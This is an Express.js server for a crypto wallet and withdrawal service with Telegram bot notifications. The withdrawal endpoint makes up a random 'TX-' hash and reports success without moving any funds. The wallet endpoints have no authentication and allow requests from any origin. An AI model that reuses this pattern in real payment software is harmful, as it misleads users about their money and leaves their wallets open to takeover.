const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const { bot, sendWithdrawNotification } = require("./bot");

const app = express();
app.use(bodyParser.json());
app.use(express.static("public"));

// CORS (解决 OPTIONS 502)
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});

// 设置 Webhook
const webhookUrl = process.env.WEBHOOK_URL;
bot.telegram.setWebhook(webhookUrl + "/telegraf");
app.use(bot.webhookCallback("/telegraf"));

// 内存存储
let USER_WALLET = null;
let WITHDRAW_PASSWORD = null;

// 获取钱包
app.get("/api/wallet", (req, res) => {
  res.json({ wallet: USER_WALLET });
});

// 绑定或修改钱包
app.post("/api/wallet", (req, res) => {
  const { wallet, oldWallet } = req.body;
  if (!wallet) return res.json({ success: false, error: "Wallet required" });

  if (oldWallet) {
    if (USER_WALLET !== oldWallet)
      return res.json({ success: false, error: "Old wallet incorrect" });
    USER_WALLET = wallet;
    return res.json({ success: true, wallet });
  }

  if (!USER_WALLET) {
    USER_WALLET = wallet;
    return res.json({ success: true, wallet });
  }

  return res.json({ success: false, error: "Wallet already bound" });
});

// 提现
app.post("/api/withdraw", async (req, res) => {
  const { coin, amount, wallet } = req.body;
  if (!coin || !amount || !wallet)
    return res.json({ success: false, error: "Missing params" });

  const hash =
    "TX-" +
    Date.now().toString(36) +
    "-" +
    Math.random().toString(36).substr(2, 8);

  // Telegram通知
  await sendWithdrawNotification({ coin, amount, wallet, hash });

  res.json({ success: true, hash });
});

// 前端
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public/index.html"));
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log("Webhook server running on port " + port));
